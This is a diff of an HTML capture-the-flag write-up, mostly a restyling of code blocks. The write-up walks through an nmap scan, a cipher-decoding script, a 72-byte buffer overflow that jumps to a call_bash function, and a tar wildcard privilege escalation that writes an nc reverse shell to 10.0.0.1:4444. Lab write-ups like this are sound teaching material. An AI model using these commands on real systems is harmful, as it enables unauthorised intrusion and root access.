@@ -25,7 +25,7 @@
         <div class="text">
             <p class="title"><b>nmap:</b></p>
             <ul class="writeup">
-                <pre><code class="language-sh"><b style="color:#57f199;">sudo nmap</b><b style="color:#505a7a;"> -sS -sC -sV -v</b><b> &lt;MACHINE_IP&gt;</b></code></pre>
+                <code class="language-sh"><b style="color:#57f199;">sudo nmap</b><b style="color:#505a7a;"> -sS -sC -sV -v</b><b> &lt;MACHINE_IP&gt;</b></code>
                 <p>-Pn: Disables host discovery.</p></li>
                 <p>-sV: Performs version detection for the services.</p></li>
                 <p>-sC: Performs a script scan using default scripts available in NMAP.</p></li>
@@ -86,7 +86,7 @@
 
             <!-- EXAMPLE 1 -->
             <p style="text-align: left;" class="title"><b>example 1</b></p>
-            <pre style="text-align: left;"><code>
+            <code style="text-align: left;">
                 'z' = 26 # 26th letter in the alphabet
                 'A' = 1 # 1st letter in the alphabet(26 + 1) % 26 = 1 = 'a'
 
@@ -95,36 +95,37 @@
                 'E' = 5(8 + 5) % 26 = 13 = 'm'
 
                 N.B. Mod (i.e. '%') 26 is used since there are only 26 letters in the alphabet.
-            </code></pre>
+            </code>
             <p style="text-align: left;" class="title"><b>script</b></p>
             <p></br>
               It is possible to perform these calculations manually but I decided to write a
               simple python script to do it with the help of some online sources
             </p>
-            <pre style="text-align: left;margin-left: 50px;" ><code class="language-python">
-<code style="color: #6e6efe; ">#! /bin/python3.8 </code>
+            <pre style="text-align: left;font-size: 20px;"><code class="language-python">
 
-<code style="color: #89ddff;">def</code> <code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>str<code style="color: #57f199;">)</code>:
-    list1 = <code style="color: #57f199;">[]</code>
-    a = <code style="color: #57f199;">&quot;&quot;</code>
-    <code style="color: #89ddff;">for</code> i <code style="color: #89ddff;">in</code> str:
-        list1.append<code style="color: #57f199;">((</code>ord<code style="color: #57f199;">(</code>i<code style="color: #57f199;">)</code> &amp; <code style="color: #b797ca;">31</code><code style="color: #57f199;">))</code>
+<code class="python_comment">#! /bin/python3.8 </code>
 
-    res = <code style="color: #57f199;">[]</code>
+<code class="python_func">def</code> <code class="python_myfuncions">deciphering</code><code class="python_extra">(</code>str<code class="python_extra">)</code>:
+    list1 = <code class="python_extra">[]</code>
+    a = <code class="python_extra">&quot;&quot;</code>
+    <code class="python_func">for</code> i <code class="python_func">in</code> str:
+        list1.append<code class="python_extra">((</code>ord<code class="python_extra">(</code>i<code class="python_extra">)</code> &amp; <code style="color: #b797ca;">31</code><code class="python_extra">))</code>
 
-    <code style="color: #89ddff;">for</code> ele <code style="color: #89ddff;">in</code> <code style="color: #e98567;">range</code><code style="color: #57f199;">(</code><code style="color: #b797ca;">0</code>, <code style="color: #e98567;">len</code><code style="color: #57f199;">(</code>list1<code style="color: #57f199;">)</code>, <code style="color: #b797ca;">2</code><code style="color: #57f199;">)</code>:
-        res.<code style="color: #e98567;">append</code><code style="color: #57f199;">((</code>list1<code style="color: #57f199;">[</code>ele<code style="color: #57f199;">]</code> + list1<code style="color: #57f199;">[</code>ele + 1<code style="color: #57f199;">])</code> % <code style="color: #b797ca;">26</code><code style="color: #57f199;">)</code>
+    res = <code class="python_extra">[]</code>
 
-    <code style="color: #89ddff;">for</code> i <code style="color: #89ddff;">in</code> <code style="color: #e98567;">range</code><code style="color: #57f199;">(</code><code style="color: #e98567;">len</code><code style="color: #57f199;">(</code>res<code style="color: #57f199;">))</code>:
-        tmp = <code style="color: #e98567;">chr</code><code style="color: #57f199;">(</code>res<code style="color: #57f199;">[</code>i<code style="color: #57f199;">]</code> + <code style="color: #b797ca;">64</code><code style="color: #57f199;">)</code>.<code style="color: #e98567;">lower</code><code style="color: #57f199;">()</code>
-        <code style="color: #e98567;">print</code><code style="color: #57f199;">(</code>tmp, end=<code style="color: #57f199;">&quot; &quot;)</code>
+    <code class="python_func">for</code> ele <code class="python_func">in</code> <code class="python_myfuncions">range</code><code class="python_extra">(</code><code style="color: #b797ca;">0</code>, <code class="python_myfuncions">len</code><code class="python_extra">(</code>list1<code class="python_extra">)</code>, <code style="color: #b797ca;">2</code><code class="python_extra">)</code>:
+        res.<code class="python_myfuncions">append</code><code class="python_extra">((</code>list1<code class="python_extra">[</code>ele<code class="python_extra">]</code> + list1<code class="python_extra">[</code>ele + 1<code class="python_extra">])</code> % <code style="color: #b797ca;">26</code><code class="python_extra">)</code>
 
-username = <code style="color: #57f199;">&quot;hEzAdCfHzA&quot;</code>
-<code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>username<code style="color: #57f199;">)</code>
-<code style="color: #e98567;">print</code><code style="color: #57f199;">(&quot;::&quot;</code>, end=<code style="color: #57f199;">&quot; &quot;)</code>
-password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN&quot;</code>
-<code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>password<code style="color: #57f199;">)</code>
-            </code></pre>
+    <code class="python_func">for</code> i <code class="python_func">in</code> <code class="python_myfuncions">range</code><code class="python_extra">(</code><code class="python_myfuncions">len</code><code class="python_extra">(</code>res<code class="python_extra">))</code>:
+        tmp = <code class="python_myfuncions">chr</code><code class="python_extra">(</code>res<code class="python_extra">[</code>i<code class="python_extra">]</code> + <code style="color: #b797ca;">64</code><code class="python_extra">)</code>.<code class="python_myfuncions">lower</code><code class="python_extra">()</code>
+        <code class="python_myfuncions">print</code><code class="python_extra">(</code>tmp, end=<code class="python_extra">&quot; &quot;)</code>
+
+username = <code class="python_extra">&quot;hEzAdCfHzA&quot;</code>
+<code class="python_myfuncions">deciphering</code><code class="python_extra">(</code>username<code class="python_extra">)</code>
+<code class="python_myfuncions">print</code><code class="python_extra">(&quot;::&quot;</code>, end=<code class="python_extra">&quot; &quot;)</code>
+password = <code class="python_extra">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN&quot;</code>
+<code class="python_myfuncions">deciphering</code><code class="python_extra">(</code>password<code class="python_extra">)</code>
+            </code>
 
             <p>
               Running this script gives me a username and password. If I look at the list of
@@ -152,7 +153,7 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
               I decided to use scp to copy the file to my local machine for further
               analysis.
             </p><br>
-            <pre><code class="language-sh"><b style="color:#57f199;">scp </b><b>magna@10.10.77.16:/home/magna/hcktheworld</b></code></pre><br>
+            <code style="font-size: 13px;" class="language-sh"><b style="color:#57f199;">scp </b>magna@10.10.77.16:/home/magna/hcktheworld</code><br>
             <p>
               Using Ghidra, I started examining the binary by looking at it’s main function.
               The code creates a char buffer of 64 bytes in size. The program then uses the
@@ -183,7 +184,7 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
               and “grep” to find the memory address of the “call_bash” function.
             </p><br>
 
-            <pre><code class="language-sh"><b style="color:#57f199;">readelf </b><b style="color:#505a7a;">-s </b> hacktheworld | </b><b style="color:#57f199;">grep </b><b style="color:#505a7a;">-i </b><b> &quot;call_bash&quot;</b></code></pre>
+            <code class="language-sh"><b style="color:#57f199;">readelf </b><b style="color:#505a7a;">-s </b> hacktheworld | </b><b style="color:#57f199;">grep </b><b style="color:#505a7a;">-i </b><b> &quot;call_bash&quot;</b></code>
             <p><br>
               This provided the following address seen below for the function “call_bash”.
             </p><br>
@@ -194,9 +195,9 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
             </p>
             <ul>
                 <br><strong>python2</strong> :<br><br>
-                <pre><code class="language-sh"><b style="color:#57f199;">python2 </b><b style="color:#505a7a;">-c</b> <b style="color:#e98567"> 'print &quot;A&quot;*72 + b&quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;'</b> <code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code></pre>
+                <code class="language-sh"><b style="color:#57f199;">python2 </b><b style="color:#505a7a;">-c</b> <b style="color:#e98567"> 'print &quot;A&quot;*72 + b&quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;'</b> <code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code>
                 <br><strong>python3</strong> :<br><br>
-                <pre><code class="language-sh"><code class="language-sh"><b style="color:#57f199;">python3 </b><b style="color:#505a7a;">-c </b><b style="color:#e98567">'print(&quot;A&quot;*72 + &quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;)' </b><code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code></pre>
+                <code class="language-sh"><code class="language-sh"><b style="color:#57f199;">python3 </b><b style="color:#505a7a;">-c </b><b style="color:#e98567">'print(&quot;A&quot;*72 + &quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;)' </b><code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code>
             </ul><br>
 
             <p>
@@ -207,7 +208,7 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
               I use python to import the pty module and create a fully interactive TTY shell
               as seen below.
             </p><br>
-            <pre><code class="language-sh"><b style="color:#57f199;">python </b><b style="color:#505a7a;">-c </b> <b style="color:#e98567">'import pty; pty.spawn(&quot;/bin/sh&quot;)'</b></code></pre>
+            <code class="language-sh"><b style="color:#57f199;">python </b><b style="color:#505a7a;">-c </b> <b style="color:#e98567">'import pty; pty.spawn(&quot;/bin/sh&quot;)'</b></code>
             <br>
             <p>
               After this, I navigate to the user spooky’s home directory and get the second
@@ -231,14 +232,14 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
           privileges using a tar file, I came across an article called “Exploiting
           Wildcard for Privilege Escalation” (see references). In this article, I
           discovered how I could escalate my privileges using a Tar Wildcard Injection
-          by entering the following commands.
+          by entering the following commands.<br><br>
         </p>
-        <pre><code class="language-sh">
-        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f&quot;</b><b style="color:#57f199;"> &gt; shell.sh</b>
+        <code class="language-sh">
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f&quot;</b><b style="color:#57f199;"> &gt; shell.sh</b><br><br>
 
-        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot;</b><b style="color:#57f199;">&gt;</b><b style="color:#e98567"> &quot;--checkpoint-action=exec=sh shell.sh&quot;</b>
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot;</b><b style="color:#57f199;">&gt;</b><b style="color:#e98567"> &quot;--checkpoint-action=exec=sh shell.sh&quot;</b><br><br>
 
-        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot; &gt; </b><b style="color:#505a7a;">--checkpoint=1</b></code></pre>
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot; &gt; </b><b style="color:#505a7a;">--checkpoint=1</b></code><br><br>
         <br>
         <ul style="text-align: left; margin-left: 10%;"><br>
             <p>The commands work as follows:</p>
@@ -253,7 +254,7 @@ password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHf
           Next, I setup a netcat listener on my host device for any incoming connections
           on port 4444.
         </p><br>
-        <pre><code class="language-sh"><b style="color:#57f199;">nc </b><b style="color:#505a7a;">-lvnp</b><b> 4444</b></code></pre>
+        <code class="language-sh"><b style="color:#57f199;">nc </b><b style="color:#505a7a;">-lvnp</b><b> 4444</b></code><br>
         <p><br>
           After a few minutes, I get a reverse shell with root privileges. I can then
           change to the root directory and get the final root user flag
